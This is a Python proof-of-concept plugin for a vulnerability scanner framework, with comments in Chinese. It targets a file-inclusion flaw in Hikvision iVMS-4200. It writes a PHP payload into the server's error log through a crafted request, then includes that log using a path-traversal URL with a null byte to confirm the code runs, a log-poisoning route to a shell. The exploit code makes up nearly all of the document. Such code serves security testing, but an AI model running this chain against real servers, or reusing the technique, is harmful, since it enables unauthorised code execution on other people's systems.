# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Hikvision_0000'  # 平台漏洞编号，留空
    name = 'Hikvision /Server/logs/error.log 文件包含导致GETSHELL漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-11-13'  # 漏洞公布时间
    desc = '''
        海康威视IVMS系列的监控客户端，不过大部分在内网。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=072453'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hikvision'  # 漏洞应用名称
    product_version = 'iVMS-4200'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f8a26d65-03d4-44da-a44a-25425fa23cce'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/<?echo(md5(123))?>'
            verify_url = '{target}'.format(target=self.target)+payload
            test_url = '{target}'.format(
                target=self.target)+'/index.php?controller=../../../../Server/logs/error.log%00.php'
            try:
                urllib.request.urlopen(verify_url)
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    content = urllib.request.urlopen(test_url).read()
                    if '202cb962ac59075b964b07152d234b70' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
